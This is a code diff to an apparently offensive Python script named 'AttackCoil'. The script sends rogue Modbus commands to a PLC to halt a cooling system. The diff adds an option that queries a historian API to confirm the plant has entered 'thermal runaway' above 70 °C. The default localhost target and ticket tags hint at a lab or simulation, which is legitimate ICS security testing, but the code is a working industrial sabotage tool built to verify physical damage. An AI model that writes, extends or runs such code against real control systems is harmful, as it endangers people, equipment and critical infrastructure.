@@ -21,7 +21,7 @@ except ImportError:
 logger = logging.getLogger("AttackCoil")
 
 
-def execute_attack(target_ip="127.0.0.1", port=502, unit_id=1):
+def execute_attack(target_ip="127.0.0.1", port=502, unit_id=1, historian_url=None):
     print(f"\n[!] INITIATING ATTACK: Rogue Command Injection on {target_ip}:{port} (Unit {unit_id})...")
 
     if ModbusTcpClient is None:
@@ -71,6 +71,21 @@ def execute_attack(target_ip="127.0.0.1", port=502, unit_id=1):
     success = (rc_after.bits[0] is False and rc_after.bits[2] is True and rr_after.registers[0] == 0)
     if success:
         print("[+] IMPACT CONFIRMED: Cooling system completely halted. Physical plant entering thermal runaway!")
+        # P2-02 (SEC-13): Closed-loop check via historian API
+        if historian_url:
+            print(f"[*] Verifying physical runaway via Historian at {historian_url}/api/snapshot...")
+            try:
+                import json
+                import urllib.request
+                req = urllib.request.Request(f"{historian_url.rstrip('/')}/api/snapshot")
+                with urllib.request.urlopen(req, timeout=3.0) as resp:
+                    snap = json.loads(resp.read().decode('utf-8'))
+                    temp = snap.get("telemetry", {}).get("cooling", {}).get("temp_c", 0.0)
+                    print(f"[+] Physical telemetry verified: cooling temp = {temp:.1f} °C")
+                    if temp >= 70.0:
+                        print(f"[+] CLOSED-LOOP IMPACT CONFIRMED: Temp ({temp:.1f} °C) exceeded runaway threshold (70.0 °C)")
+            except Exception as e:
+                print(f"[-] Historian verification query error: {e}")
     else:
         print("[-] Attack parameters were not fully accepted.")
 
@@ -83,9 +98,10 @@ def main():
     parser.add_argument("--target", default="127.0.0.1", help="Target PLC IP")
     parser.add_argument("--port", type=int, default=502, help="Target PLC Port")
     parser.add_argument("--unit", type=int, default=1, help="Modbus Unit ID")
+    parser.add_argument("--historian-url", default=None, help="Optional Historian URL for closed-loop validation")
     args = parser.parse_args()
 
-    execute_attack(target_ip=args.target, port=args.port, unit_id=args.unit)
+    execute_attack(target_ip=args.target, port=args.port, unit_id=args.unit, historian_url=args.historian_url)
 
 
 if __name__ == "__main__":
